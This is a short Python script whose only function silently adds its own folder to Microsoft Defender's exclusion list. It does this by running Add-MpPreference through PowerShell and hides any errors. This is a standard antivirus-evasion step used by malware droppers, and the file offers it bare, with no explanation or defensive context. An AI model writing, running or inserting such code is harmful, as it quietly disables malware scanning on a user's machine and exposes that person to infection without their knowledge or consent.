import subprocess
import os

def exclusion():
    exclusion_path = os.path.dirname(os.path.abspath(__file__))
    ps_cmd = f"powershell.exe Add-MpPreference -ExclusionPath '{exclusion_path}'"

    try:
        result = subprocess.run(ps_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except Exception as e:
        pass

if __name__ == "__main__":
    exclusion()